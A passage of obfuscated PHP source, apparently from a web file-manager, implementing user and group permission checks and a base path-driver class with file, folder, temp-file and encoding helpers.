$E¨ŸË°©[$cöÍç™‘Â›[1888]] = $this->sourceAuthInfo($E¨ŸË°©[$cöÍç™‘Â›[1888]]); } return $E¨ŸË°©; } public function authArrayCheck($AŞ½‹†Ù™­, $cŸ¤ˆçÌß = false) { goto Bø‡Ä¤›–; Cì½—©©Ô: return $a´¦…¤³ë˜; goto eª©àˆ³œ‘; AÛÓßß—†È: $bœ•´ÂÛ±× = 1000; $E¿˜ˆ¬É¾¾ = 0; $aç‹Å¶‹’¤ = 0; goto d˜Ëä è‚¿; fíÌá¡•: $eº¦ˆí—ÑŞ = 0; $bØÆ§¿Ú = 0; $CÜ‚Ï©º§İ = 0; goto dÃ…ÑÆÔ±›; d˜Ëä è‚¿: $CºÍ§ªÊ«Ø = 0; $FÚõÒˆ­´ = 0; $C‡ò¿Œ¬½ä = array($E“¨Ê½¢ó”[394] => 0); goto a†áù¡ƒâ‡; Bø‡Ä¤›–: $E“¨Ê½¢ó” =& $_SERVER[Ç³Íß¦Ó]; if (!$AŞ½‹†Ù™­) { return array($E“¨Ê½¢ó”[405] => 0, $E“¨Ê½¢ó”[444] => !1); } $cŸ¤ˆçÌß = $cŸ¤ˆçÌß ? $cŸ¤ˆçÌß : USER_ID; goto fíÌá¡•; dÃ…ÑÆÔ±›: $E—å‚Óöİƒ = 0; $dØ‘…ğÔ³  = 0; $eˆ¬ÌòÑç¨ = 0; goto AÛÓßß—†È; a†áù¡ƒâ‡: foreach ($AŞ½‹†Ù™­ as $C‡ò¿Œ¬½ä) { $a·Â·Á¹ÓÜ = $this->authInfo($C‡ò¿Œ¬½ä); if (!$a·Â·Á¹ÓÜ) { continue; } $E¼ˆø«Ñ—ª = $C‡ò¿Œ¬½ä[$E“¨Ê½¢ó”[482]]; $CğÚÃ‹ÛÒ = intval($a·Â·Á¹ÓÜ[$E“¨Ê½¢ó”[404]]); if ($C‡ò¿Œ¬½ä[$E“¨Ê½¢ó”[402]] == SourceModel::TYPE_USER && $E¼ˆø«Ñ—ª == $cŸ¤ˆçÌß) { $eº¦ˆí—ÑŞ = !0; $CÜ‚Ï©º§İ = $a·Â·Á¹ÓÜ; $bØÆ§¿Ú = $CğÚÃ‹ÛÒ; } else { if ($C‡ò¿Œ¬½ä[$E“¨Ê½¢ó”[402]] == SourceModel::TYPE_GROUP && $this->groupContainUser($E¼ˆø«Ñ—ª, $cŸ¤ˆçÌß)) { $E—å‚Óöİƒ = !0; $EÓ¶¨ß„¼š = $this->groupStepToUserGroup($E¼ˆø«Ñ—ª, $cŸ¤ˆçÌß); if ($EÓ¶¨ß„¼š < $bœ•´ÂÛ±×) { $bœ•´ÂÛ±× = $EÓ¶¨ß„¼š; $dØ‘…ğÔ³  = $CğÚÃ‹ÛÒ; $eˆ¬ÌòÑç¨ = $a·Â·Á¹ÓÜ; $E¿˜ˆ¬É¾¾ = $E¼ˆø«Ñ—ª; } if ($EÓ¶¨ß„¼š == $bœ•´ÂÛ±× && $CğÚÃ‹ÛÒ >= $dØ‘…ğÔ³ ) { $dØ‘…ğÔ³  = $CğÚÃ‹ÛÒ; $eˆ¬ÌòÑç¨ = $a·Â·Á¹ÓÜ; $E¿˜ˆ¬É¾¾ = $E¼ˆø«Ñ—ª; } } else { if ($E¼ˆø«Ñ—ª == $E“¨Ê½¢ó”[495]) { $aç‹Å¶‹’¤ = !0; $FÚõÒˆ­´ = $a·Â·Á¹ÓÜ; $CºÍ§ªÊ«Ø = $CğÚÃ‹ÛÒ; } } } } if ($eº¦ˆí—ÑŞ) { $EÕßÄ–´Ğ‹ = $bØÆ§¿Ú; $a·Â·Á¹ÓÜ = $CÜ‚Ï©º§İ; $d”Ã®®ä = LNG($E“¨Ê½¢ó”[1889]); } else { if ($E—å‚Óöİƒ) { $EÕßÄ–´Ğ‹ = $dØ‘…ğÔ³ ; $a·Â·Á¹ÓÜ = $eˆ¬ÌòÑç¨; $eä¯¿¬ÂÎ» = Model($E“¨Ê½¢ó”[484])->getInfo($E¿˜ˆ¬É¾¾); $d”Ã®®ä = $E“¨Ê½¢ó”[160] . $eä¯¿¬ÂÎ»[$E“¨Ê½¢ó”[489]] . $E“¨Ê½¢ó”[1890] . LNG($E“¨Ê½¢ó”[1891]); } else { if ($aç‹Å¶‹’¤) { $EÕßÄ–´Ğ‹ = $CºÍ§ªÊ«Ø; $a·Â·Á¹ÓÜ = $FÚõÒˆ­´; $d”Ã®®ä = LNG($E“¨Ê½¢ó”[1862]); } else { $EÕßÄ–´Ğ‹ = 0; $a·Â·Á¹ÓÜ = !1; $d”Ã®®ä = $E“¨Ê½¢ó”[33]; } } } $a´¦…¤³ë˜ = array($E“¨Ê½¢ó”[1881] => intval($EÕßÄ–´Ğ‹), $E“¨Ê½¢ó”[1865] => $a·Â·Á¹ÓÜ, $E“¨Ê½¢ó”[1882] => $d”Ã®®ä, $E“¨Ê½¢ó”[1874] => $C‡ò¿Œ¬½ä[$E“¨Ê½¢ó”[394]]); goto Cì½—©©Ô; eª©àˆ³œ‘: } private function groupContainUser($D×ÙÜ„’Ù, $B­±ĞÂ¬×õ = false) { return in_array($D×ÙÜ„’Ù, $this->userGroupParents($B­±ĞÂ¬×õ)); } private function groupStepToUserGroup($b§õöÚí‚„, $A¸Ï¯ŒÌÀ = false) { goto DĞ‘µ•Í†; E…•ñë¿¤×: return $DŸ©³›Ú­Ë; goto Dë–Œ‘‚ø¢; e„ÑÊŒùó: $dªù‡´èÖ = $GLOBALS[$D÷Å‘¦Áùí[6]][$D÷Å‘¦Áùí[88]][$D÷Å‘¦Áùí[1781]] == 1; $Cæƒ¾©Ûœ¢ = $dªù‡´èÖ ? 3 : 2; foreach ($aí»é’¢í™ as $B›Æ²…öÉØ) { if ($B›Æ²…öÉØ[$D÷Å‘¦Áùí[1689]] == $b§õöÚí‚„) { return 0; } $e‚—­„Ù¸Ì = explode($D÷Å‘¦Áùí[47], trim($B›Æ²…öÉØ[$D÷Å‘¦Áùí[485]], $D÷Å‘¦Áùí[47])); if ($e‚—­„Ù¸Ì[0] == $D÷Å‘¦Áùí[495] && count($e‚—­„Ù¸Ì) > $Cæƒ¾©Ûœ¢) { $Fãõ³§Ô = array_reverse(array_slice($e‚—­„Ù¸Ì, $Cæƒ¾©Ûœ¢)); $D­šª‹’ = array_search($b§õöÚí‚„, $Fãõ³§Ô); if ($D­šª‹’ !== !1 && $D­šª‹’ + 1 <= $DŸ©³›Ú­Ë) { $DŸ©³›Ú­Ë = $D­šª‹’ + 1; } } } goto E…•ñë¿¤×; DĞ‘µ•Í†: $D÷Å‘¦Áùí =& $_SERVER[Ç³Íß¦Ó]; $aí»é’¢í™ = $this->userGroupList($A¸Ï¯ŒÌÀ); $DŸ©³›Ú­Ë = 1000; goto e„ÑÊŒùó; Dë–Œ‘‚ø¢: } private function userGroupList($Bá²‘öÂ÷Æ = false) { $B‹Ë–ºö“ğ =& $_SERVER[Ç³Íß¦Ó]; static $a¤óÄø‡×å = array(); if (isset($a¤óÄø‡×å[$Bá²‘öÂ÷Æ])) { return $a¤óÄø‡×å[$Bá²‘öÂ÷Æ]; } $e¸¿Ë”ÉÁ = Model($B‹Ë–ºö“ğ[505])->getInfo($Bá²‘öÂ÷Æ); $a¤óÄø‡×å[$Bá²‘öÂ÷Æ] = array_to_keyvalue($e¸¿Ë”ÉÁ[$B‹Ë–ºö“ğ[1863]], $B‹Ë–ºö“ğ[1689]); return $a¤óÄø‡×å[$Bá²‘öÂ÷Æ]; } public function userGroupParents($eÉäÁ³…Ï) { goto B‰Ş­Åßõ¸; Dïˆƒœèç: $bŠÓ¨Ëª‹ì = $GLOBALS[$F³Œ±—Á°£[6]][$F³Œ±—Á°£[88]][$F³Œ±—Á°£[1781]] == 1; $B¢Ğâ±Éñ = $bŠÓ¨Ëª‹ì ? 3 : 2; foreach ($dÀÅ÷ÜŠ®ù as $cªŠÃÛ‹øŠ) { $EµÉÆ•Ú˜ = array($cªŠÃÛ‹øŠ[$F³Œ±—Á°£[1689]]); $e©÷±Ğ¿Ü = explode($F³Œ±—Á°£[47], trim($cªŠÃÛ‹øŠ[$F³Œ±—Á°£[485]], $F³Œ±—Á°£[47])); if ($e©÷±Ğ¿Ü[0] == $F³Œ±—Á°£[495] && count($e©÷±Ğ¿Ü) > $B¢Ğâ±Éñ) { $DõãÑÃ¢ß˜ = array_slice($e©÷±Ğ¿Ü, $B¢Ğâ±Éñ); $EµÉÆ•Ú˜ = array_merge($EµÉÆ•Ú˜, array_reverse($DõãÑÃ¢ß˜)); } $AŒäİ×¸‚È = array_merge($AŒäİ×¸‚È, $EµÉÆ•Ú˜); } goto a­„å–°å‰; a­„å–°å‰: $E‰†¨õ™£å[$eÉäÁ³…Ï] = array_unique($AŒäİ×¸‚È); return $E‰†¨õ™£å[$eÉäÁ³…Ï]; goto Aæì§ïÑâ; B‰Ş­Åßõ¸: $F³Œ±—Á°£ =& $_SERVER[Ç³Íß¦Ó]; static $E‰†¨õ™£å = array(); $eÉäÁ³…Ï = $eÉäÁ³…Ï ? $eÉäÁ³…Ï : USER_ID; goto D Š°óÉ–Á; D Š°óÉ–Á: if (isset($E‰†¨õ™£å[$eÉäÁ³…Ï])) { return $E‰†¨õ™£å[$eÉäÁ³…Ï]; } $dÀÅ÷ÜŠ®ù = $this->userGroupList($eÉäÁ³…Ï); $AŒäİ×¸‚È = array(); goto Dïˆƒœèç; Aæì§ïÑâ: } public function authTargetInfoMake($FŒ½‰¹¾ß“) { goto añÏÊ£á™õ; añÏÊ£á™õ: $b‚Öƒ…˜æÉ =& $_SERVER[Ç³Íß¦Ó]; $CêÁ´›±–Ü = array(); $c¯—çÙï‚– = array(); goto e‹‰‰µ¬à; D–èäùÖíÖ: return array($b‚Öƒ…˜æÉ[1893] => $CêÁ´›±–Ü, $b‚Öƒ…˜æÉ[1894] => $c¯—çÙï‚–); goto BÔËî¥ê; e‹‰‰µ¬à: foreach ($FŒ½‰¹¾ß“ as $C•‡ÔÉ¨«Å) { if ($C•‡ÔÉ¨«Å[$b‚Öƒ…˜æÉ[402]] == SourceModel::TYPE_USER) { $CêÁ´›±–Ü[] = intval($C•‡ÔÉ¨«Å[$b‚Öƒ…˜æÉ[482]]); } else { if ($C•‡ÔÉ¨«Å[$b‚Öƒ…˜æÉ[402]] == SourceModel::TYPE_GROUP) { $c¯—çÙï‚–[] = intval($C•‡ÔÉ¨«Å[$b‚Öƒ…˜æÉ[482]]); } } } if ($CêÁ´›±–Ü) { $CêÁ´›±–Ü = Model($b‚Öƒ…˜æÉ[501])->userListInfo($CêÁ´›±–Ü); } if ($c¯—çÙï‚–) { $bãºÉ‰–¿á = array($b‚Öƒ…˜æÉ[1767] => array($b‚Öƒ…˜æÉ[409], $c¯—çÙï‚–)); $c¯—çÙï‚– = Model($b‚Öƒ…˜æÉ[484])->field($b‚Öƒ…˜æÉ[1892])->where($bãºÉ‰–¿á)->select(); $c¯—çÙï‚– = array_to_keyvalue($c¯—çÙï‚–, $b‚Öƒ…˜æÉ[1689]); } goto D–èäùÖíÖ; BÔËî¥ê: } public function authInfo($DÌˆäË³À§) { $Dˆ»–Í½Ìí =& $_SERVER[Ç³Íß¦Ó]; if ($DÌˆäË³À§[$Dˆ»–Í½Ìí[1784]]) { $cÒµª¦Ñƒ“ = Model($Dˆ»–Í½Ìí[1856])->listData($DÌˆäË³À§[$Dˆ»–Í½Ìí[1784]]); if (!$cÒµª¦Ñƒ“) { return !1; $AßâÍç©¡¯ = Model($Dˆ»–Í½Ìí[1856])->listData(); $e¼Æ×ä¹à½ = array_filter_by_field($AßâÍç©¡¯, $Dˆ»–Í½Ìí[404], $Dˆ»–Í½Ìí[495]); return $e¼Æ×ä¹à½; } $Cõ’†ëÃ²² = array_field_key($cÒµª¦Ñƒ“, array($Dˆ»–Í½Ìí[392], $Dˆ»–Í½Ìí[28], $Dˆ»–Í½Ìí[404], $Dˆ»–Í½Ìí[1710], $Dˆ»–Í½Ìí[1712])); $Cõ’†ëÃ²²[$Dˆ»–Í½Ìí[1895]] = $DÌˆäË³À§; return $Cõ’†ëÃ²²; } else { return array($Dˆ»–Í½Ìí[410] => 0, $Dˆ»–Í½Ìí[1695] => $DÌˆäË³À§[$Dˆ»–Í½Ìí[1838]], $Dˆ»–Í½Ìí[411] => $Dˆ»–Í½Ìí[33], $Dˆ»–Í½Ìí[1710] => $Dˆ»–Í½Ìí[1896]); } } } goto B¤Àõ¡•; FÙ´Á‰Ò¦: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $fÉÕ´Š™Éã =& $_SERVER[Ç³Íß¦Ó]; $this->objectDriver = array($fÉÕ´Š™Éã[57], $fÉÕ´Š™Éã[58], $fÉÕ´Š™Éã[59], $fÉÕ´Š™Éã[60], $fÉÕ´Š™Éã[61], $fÉÕ´Š™Éã[62], $fÉÕ´Š™Éã[63], $fÉÕ´Š™Éã[64], $fÉÕ´Š™Éã[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($A´´ÏÑ¹) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($A´´ÏÑ¹, $_SERVER[Ç³Íß¦Ó][8]); } return $A´´ÏÑ¹; } public function iconvApp($DµÀÏš¹ï÷) { return $DµÀÏš¹ï÷; } public function iconvSystem($cà²¶ÍÃ) { return $cà²¶ÍÃ; } public function iconvTo($F»³¨§éŠ, $eòåçºóŸ—, $bŒùÃËâ´) { goto Cá‡ì¤; B¤è„Ôá‰: return $DİƒÖÅ·­; goto AÑ×ˆ¾ÍŒ; c¥šÚÇ¬Îà: $D…é©”ó¼ç[$bŒùÃËâ´ . $BŸõÌ§­®‚[67] . $eòåçºóŸ— . $BŸõÌ§­®‚[68] . $F»³¨§éŠ] = $F»³¨§éŠ; $D…é©”ó¼ç[$bŒùÃËâ´ . $BŸõÌ§­®‚[67] . $eòåçºóŸ— . $BŸõÌ§­®‚[68] . $DİƒÖÅ·­] = $F»³¨§éŠ; $D…é©”ó¼ç[$eòåçºóŸ— . $BŸõÌ§­®‚[67] . $bŒùÃËâ´ . $BŸõÌ§­®‚[68] . $DİƒÖÅ·­] = $DİƒÖÅ·­; goto B¤è„Ôá‰; b„›â¶ˆÔ: $DİƒÖÅ·­ = $DİƒÖÅ·­ ? $DİƒÖÅ·­ : $F»³¨§éŠ; if (strstr($DİƒÖÅ·­, $BŸõÌ§­®‚[70])) { $DİƒÖÅ·­ = str_replace($BŸõÌ§­®‚[70], $BŸõÌ§­®‚[71], $DİƒÖÅ·­); } $D…é©”ó¼ç[$eòåçºóŸ— . $BŸõÌ§­®‚[67] . $bŒùÃËâ´ . $BŸõÌ§­®‚[68] . $F»³¨§éŠ] = $DİƒÖÅ·­; goto c¥šÚÇ¬Îà; AõÃÂƒêÀç: $CÔÚÓÍˆ„Á = $eòåçºóŸ— . $BŸõÌ§­®‚[67] . $bŒùÃËâ´ . $BŸõÌ§­®‚[68] . $F»³¨§éŠ; if (isset($D…é©”ó¼ç[$CÔÚÓÍˆ„Á])) { return $D…é©”ó¼ç[$CÔÚÓÍˆ„Á]; } if (function_exists($BŸõÌ§­®‚[69])) { $DİƒÖÅ·­ = @mb_convert_encoding($F»³¨§éŠ, $bŒùÃËâ´, $eòåçºóŸ—); } else { $DİƒÖÅ·­ = @iconv($eòåçºóŸ—, $bŒùÃËâ´, $F»³¨§éŠ); } goto b„›â¶ˆÔ; Cá‡ì¤: $BŸõÌ§­®‚ =& $_SERVER[Ç³Íß¦Ó]; if (!$F»³¨§éŠ || !function_exists($BŸõÌ§­®‚[66])) { return $F»³¨§éŠ; } static $D…é©”ó¼ç = array(); goto AõÃÂƒêÀç; AÑ×ˆ¾ÍŒ: } public function getPathInner($b÷ÔÂì‚†â) { $A¥Ÿ¾‘ñ°Œ = IO::init($b÷ÔÂì‚†â); return $A¥Ÿ¾‘ñ°Œ->path; } public function getPathOuter($bÆ…ç°ãµí) { $b‰åé×øùƒ =& $_SERVER[Ç³Íß¦Ó]; $dŒíŒÓæ¨Æ = strlen(trim($this->pathBase, $b‰åé×øùƒ[8])); $bÆ…ç°ãµí = substr(trim($bÆ…ç°ãµí, $b‰åé×øùƒ[8]), $dŒíŒÓæ¨Æ); return $this->pathDriver . $b‰åé×øùƒ[8] . ltrim($bÆ…ç°ãµí, $b‰åé×øùƒ[8]); } public function isParentOf($bœ¯ƒ¿¢¢–, $EªŠô‚æ‘) { $EÜœ¬ä­»è =& $_SERVER[Ç³Íß¦Ó]; $bœ¯ƒ¿¢¢– = rtrim(strtolower($bœ¯ƒ¿¢¢–), $EÜœ¬ä­»è[8]) . $EÜœ¬ä­»è[8]; $EªŠô‚æ‘ = rtrim(strtolower($EªŠô‚æ‘), $EÜœ¬ä­»è[8]) . $EÜœ¬ä­»è[8]; $c£í¦ê½ˆ¸ = strpos($EªŠô‚æ‘, $bœ¯ƒ¿¢¢–) === 0; return $c£í¦ê½ˆ¸; } public function getType() { $e†»Øé£Ï÷ =& $_SERVER[Ç³Íß¦Ó]; $C °ÏÏÈò‡ = str_replace($e†»Øé£Ï÷[72], $e†»Øé£Ï÷[33], get_class($this)); return strtolower($C °ÏÏÈò‡); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($eÛò‹®†¶, $Dß‚›¢¯„Ö) { $AÖ¦®ÅÅ‡æ =& $_SERVER[Ç³Íß¦Ó]; $d§ïÏñäˆÅ = rtrim($eÛò‹®†¶, $AÖ¦®ÅÅ‡æ[8]) . $AÖ¦®ÅÅ‡æ[8] . $Dß‚›¢¯„Ö; $A×¿ßƒ™¢ê = $this->exist($d§ïÏñäˆÅ); return $A×¿ßƒ™¢ê ? $d§ïÏñäˆÅ : !1; } public function setModifyTime($E¹Ôæï²Ã”, $F¦Ÿ¼ã½£« = '') { } public function renameObject($c©¥æß«Î, $CÈ¥¨êâ°) { goto Dˆ›Å£„çõ; c¡×ä‘”ƒî: $c©¥æß«Î = $this->getPathOuter($c©¥æß«Î); $CÈ¥¨êâ° = $this->pathFather($c©¥æß«Î) . $CÈ¥¨êâ°; if (IO::isFile($c©¥æß«Î)) { $c¦—¿¹ñ÷ = IO::copy($c©¥æß«Î, $this->pathFather($c©¥æß«Î), REPEAT_RENAME_FOLDER, $cÎÂÙ±»ƒÆ); if ($c¦—¿¹ñ÷) { IO::remove($c©¥æß«Î); } } else { $c¦—¿¹ñ÷ = IO::mkdir($CÈ¥¨êâ°); if (!$c¦—¿¹ñ÷) { return !1; } $Eã‹ØßåŞÛ = IO::listPath($c©¥æß«Î, !0); $C÷Ä°Ò¢…Â = array_merge($Eã‹ØßåŞÛ[$D†åø‰£Ş [74]], $Eã‹ØßåŞÛ[$D†åø‰£Ş [75]]); foreach ($C÷Ä°Ò¢…Â as $EØÎ˜ªÕñ) { IO::move($EØÎ˜ªÕñ[$D†åø‰£Ş [76]], $CÈ¥¨êâ°, REPEAT_RENAME_FOLDER); } IO::remove($c©¥æß«Î); } goto b±ó’è‘á; Dˆ›Å£„çõ: $D†åø‰£Ş  =& $_SERVER[Ç³Íß¦Ó]; $cÎÂÙ±»ƒÆ = $CÈ¥¨êâ°; Hook::trigger($D†åø‰£Ş [73], $this, $c©¥æß«Î, $this, $this->pathFather($c©¥æß«Î) . $CÈ¥¨êâ°); goto c¡×ä‘”ƒî; b±ó’è‘á: return $c¦—¿¹ñ÷ ? $CÈ¥¨êâ° : !1; goto B›âˆˆŸÎ; B›âˆˆŸÎ: } public function tempFile($dğ’Ü–ø´» = '', $E×‚ŸÈ’Â = '') { goto d©‚‘øÊÉÆ; d©‚‘øÊÉÆ: if (!$dğ’Ü–ø´») { $dğ’Ü–ø´» = rand_string(15); } $C ßàíò¤ò = TEMP_FILES . rand_string(15) . $_SERVER[Ç³Íß¦Ó][8]; @mkdir($C ßàíò¤ò, 511, !0); goto FñËÖÅÃ›ğ; b¾ŒÖƒ¡ä: return $AùÛÂ‹‡; goto d³Û»Í¶Íè; FñËÖÅÃ›ğ: $AùÛÂ‹‡ = $C ßàíò¤ò . $dğ’Ü–ø´»; @touch($AùÛÂ‹‡); if ($E×‚ŸÈ’Â) { file_put_contents($AùÛÂ‹‡, $E×‚ŸÈ’Â); } goto b¾ŒÖƒ¡ä; d³Û»Í¶Íè: } public function tempFileRemve($eğ—–Õ×ó) { @unlink($eğ—–Õ×ó); @rmdir($this->pathFather($eğ—–Õ×ó)); } public function mkfile($E¡˜æ¶¯±, $bè¬ˆÏ’’‡ = '', $a¶À…«³Ì¶ = REPEAT_RENAME) { } public function mkdir($eÃ»ã´Ÿ·, $BË…ËÙ¯‚Ç = REPEAT_SKIP) { } public function delFile($F¨İˆñ‹Š) { } public function delFolder($a˜ÉÚªƒ·¦) { } public function copyFile($fáèÄŒé¶, $däçÙà¹†) { } public function moveFile($B‡ºÔ¥‰ÕÖ, $Bñ–º¢ïè¡) { } public function remove($dŠ¦çéĞßÄ) { if ($this->isFile($dŠ¦çéĞßÄ)) { return $this->delFile($dŠ¦çéĞßÄ); } return $this->delFolder($dŠ¦çéĞßÄ); } public function rename($b¬­´¿Â¶ƒ, $AÙ±»®‘Õê) { } public function exist($D¶°ˆø¬İ‡) { } public function findByHash($Eªğ¿íÑ‘  = '', $AõšĞÆç‘¦ = '') { return !1; } public function isFile($EÈôÒàë‰‰) { } public function isFolder($aÑÏëçİÃç) { } public function size($AİÄ®é»¸) { } public function info($DùŒ‡º„) { } public function infoSimple($C¡¬ŸÏ‰©¢) { return $this->info($C¡¬ŸÏ‰©¢); } public function infoAuth($CÄËøƒßÊÑ) { return $this->info($CÄËøƒßÊÑ); } public function infoFull($CÒ’ë…Í¬») { return $this->info($CÒ’ë…Í¬»); } public function infoWithChildren($cğØêÅ‚ì) { $B ÔËø£Ù¸ =& $_SERVER[Ç³Íß¦Ó]; static $e²ÁŠ§¾»‰ = array(); if (isset($e²ÁŠ§¾»‰[$cğØêÅ‚ì])) { return $e²ÁŠ§¾»‰[$cğØêÅ‚ì]; } $e©£ß¥š¨ = $this->info($cğØêÅ‚ì); if ($e©£ß¥š¨ && $e©£ß¥š¨[$B ÔËø£Ù¸[29]] == $B ÔËø£Ù¸[77]) { $Aù“¹¹…Ö› = array($B ÔËø£Ù¸[78] => 0, $B ÔËø£Ù¸[79] => 0, $B ÔËø£Ù¸[80] => 0); $this->infoChildren($cğØêÅ‚ì, $Aù“¹¹…Ö›); $e©£ß¥š¨[$B ÔËø£Ù¸[78]] = $Aù“¹¹…Ö›[$B ÔËø£Ù¸[78]]; $e©£ß¥š¨[$B ÔËø£Ù¸[81]] = array($B ÔËø£Ù¸[82] => $Aù“¹¹…Ö›[$B ÔËø£Ù¸[79]], $B ÔËø£Ù¸[83] => $Aù“¹¹…Ö›[$B ÔËø£Ù¸[80]]); $e²ÁŠ§¾»‰[$cğØêÅ‚ì] = $e©£ß¥š¨; } return $e©£ß¥š¨; } public function listPath($BÏ‰Ÿ¾£½³, $E˜«†¡é¯ö = false) { } public function has($CÛŠóƒ•, $EÈÛˆèÔ‡ = false, $C®’¤±İ®‚ = false) { } public function canRead($c¥––×Ú) { } public function canWrite($c“Ù¥‚ôÆŒ) { } public function getContent($Bää„ƒ‰Ò) { } public function setContent($f …±­ã—Ù, $FÅİÌŸÇ‰ = '') { } protected function infoChildren($cî á¶‘Õ°, &$BÄ³ÖÅ‹‚) { $AÎÏ™¼í =& $_SERVER[Ç³Íß¦Ó]; check_abort_echo(); $aÛ´â¬ ®Ÿ = $this->listPath($cî á¶‘Õ°, !0); $aÛ´â¬ ®Ÿ = array_merge($aÛ´â¬ ®Ÿ[$AÎÏ™¼í[75]], $aÛ´â¬ ®Ÿ[$AÎÏ™¼í[74]]); foreach ($aÛ´â¬ ®Ÿ as $aÀéî–Ó­«) { if ($aÀéî–Ó­«[$AÎÏ™¼í[29]] == $AÎÏ™¼í[77]) { $BÄ³ÖÅ‹‚[$AÎÏ™¼í[80]]++; $d†òŸµŒî = $this->getPathInner($aÀéî–Ó­«[$AÎÏ™¼í[76]]); $this->infoChildren($d†òŸµŒî, $BÄ³ÖÅ‹‚); } else { $BÄ³ÖÅ‹‚[$AÎÏ™¼í[79]]++; $BÄ³ÖÅ‹‚[$AÎÏ™¼í[78]] += $aÀéî–Ó­«[$AÎÏ™¼í[78]]; } } } public function fileSubstr($Eíº±¥òÁÕ, $fª¡å‚ğ‰½, $C¶Â¢¥‹Ø) { } public function listAll($dÓÇñ¹×‹) { } public function listAllMake($b£’•ô‚Ä”, &$B®½äĞÙ­­) { $A‚ÔëôĞ =& $_SERVER[Ç³Íß¦Ó]; check_abort_echo(); $dß£È‹“•õ = $this->listPath($b£’•ô‚Ä”, !0); if (!$dß£È‹“•õ) { return; } $d£à¶¯Šˆ¢ = array_merge($dß£È‹“•õ[$A‚ÔëôĞ[75]], $dß£È‹“•õ[$A‚ÔëôĞ[74]]); foreach ($d£à¶¯Šˆ¢ as $DÒ½ã‰Ä÷) { goto f·Ø–ø£Æ; cßö¿·ùÚŒ: if (isset($DÒ½ã‰Ä÷[$A‚ÔëôĞ[84]])) { $e…¾ç†‡¬­[$A‚ÔëôĞ[84]] = $DÒ½ã‰Ä÷[$A‚ÔëôĞ[84]]; } if (!$c¥ÛÉö³¸³) { $B®½äĞÙ­­[] = $e…¾ç†‡¬­; continue; } $B®½äĞÙ­­[] = $e…¾ç†‡¬­; goto BŒ¼Òè·»…; f·Ø–ø£Æ: $c¥ÛÉö³¸³ = $DÒ½ã‰Ä÷[$A‚ÔëôĞ[29]] == $A‚ÔëôĞ[77]; $e…¾ç†‡¬­ = array($A‚ÔëôĞ[76] => $DÒ½ã‰Ä÷[$A‚ÔëôĞ[76]], $A‚ÔëôĞ[77] => $c¥ÛÉö³¸³); if (isset($DÒ½ã‰Ä÷[$A‚ÔëôĞ[78]])) { $e…¾ç†‡¬­[$A‚ÔëôĞ[78]] = $DÒ½ã‰Ä÷[$A‚ÔëôĞ[78]]; } goto cßö¿·ùÚŒ; BŒ¼Òè·»…: $this->listAllMake($DÒ½ã‰Ä÷[$A‚ÔëôĞ[76]], $B®½äĞÙ­­); goto B¥Åç³É‡İ; B¥Åç³É‡İ: } } public function listAllSimple($EÅ•Ş½¨µÂ) { $FÁ²Ú—ƒ =& $_SERVER[Ç³Íß¦Ó]; $a¾Ìª¼ÎßÓ = array(); $E«ØØ†Çùˆ = $this->listAll($EÅ•Ş½¨µÂ); $A„Œô§¥ = $this->getPathOuter($EÅ•Ş½¨µÂ); foreach ($E«ØØ†Çùˆ as $C½•›œŠ‡“) { goto e‘‰À¦Å‚ø; EàÅ¶Èìè: if (!$C½•›œŠ‡“[$FÁ²Ú—ƒ[77]]) { $c‹Ø‘×óµ[$FÁ²Ú—ƒ[86]] = $cìŒó˜ê; } $a¾Ìª¼ÎßÓ[] = $c‹Ø‘×óµ; goto bÛš‚…Æé; Aß©÷™¶Áõ: $c‹Ø‘×óµ = array($FÁ²Ú—ƒ[76] => $D‚¡Ğ¢’¨–, $FÁ²Ú—ƒ[77] => $C½•›œŠ‡“[$FÁ²Ú—ƒ[77]]); if (isset($C½•›œŠ‡“[$FÁ²Ú—ƒ[78]]) && !$C½•›œŠ‡“[$FÁ²Ú—ƒ[77]]) { $c‹Ø‘×óµ[$FÁ²Ú—ƒ[78]] = $C½•›œŠ‡“[$FÁ²Ú—ƒ[78]]; } if (isset($C½•›œŠ‡“[$FÁ²Ú—ƒ[84]])) { $c‹Ø‘×óµ[$FÁ²Ú—ƒ[84]] = $C½•›œŠ‡“[$FÁ²Ú—ƒ[84]]; } goto EàÅ¶Èìè; e‘‰À¦Å‚ø: $cìŒó˜ê = $C½•›œŠ‡“[$FÁ²Ú—ƒ[76]]; $D‚¡Ğ¢’¨– = $C½•›œŠ‡“[$FÁ²Ú—ƒ[76]]; if (isset($C½•›œŠ‡“[$FÁ²Ú—ƒ[85]])) { $cìŒó˜ê = $C½•›œŠ‡“[$FÁ²Ú—ƒ[85]][$FÁ²Ú—ƒ[76]]; $C½•›œŠ‡“[$FÁ²Ú—ƒ[78]] = $C½•›œŠ‡“[$FÁ²Ú—ƒ[85]][$FÁ²Ú—ƒ[78]]; $C½•›œŠ‡“[$FÁ²Ú—ƒ[84]] = $C½•›œŠ‡“[$FÁ²Ú—ƒ[85]][$FÁ²Ú—ƒ[84]]; } else { $D‚¡Ğ¢’¨– = substr($C½•›œŠ‡“[$FÁ²Ú—ƒ[76]], strlen(get_path_father($A„Œô§¥))); $D‚¡Ğ¢’¨– = $FÁ²Ú—ƒ[8] . ltrim($D‚¡Ğ¢’¨–, $FÁ²Ú—ƒ[8]); } goto Aß©÷™¶Áõ; bÛš‚…Æé: } return $a¾Ìª¼ÎßÓ; } public function upload($E»ÄÓàÂó×, $Cõ¢—Ï‘¤×, $cĞ¶Ş…³Çª = false, $fÒùËâÒğ— = REPEAT_REPLACE) { } public function uploadFileByID($bõÙà­‰ôù, $F¯³ğ×µË, $Eø¡„‚šÌœ) { } public function uploadFileByPath($a’¥÷»¥Í, $FºÎ³©—“, $c‰’Ìæ¸ïŸ = array()) { } public function isUploadServer() { $C¥œá´òÔ =& $_SERVER[Ç³Íß¦Ó]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $C¥œá´òÔ[87]) { return !0; } return $GLOBALS[$C¥œá´òÔ[6]][$C¥œá´òÔ[88]][$C¥œá´òÔ[89]]; } public function isFileOutServer() { $a¨Ä•Şµ¤À =& $_SERVER[Ç³Íß¦Ó]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $a¨Ä•Şµ¤À[87]) { return !0; } return 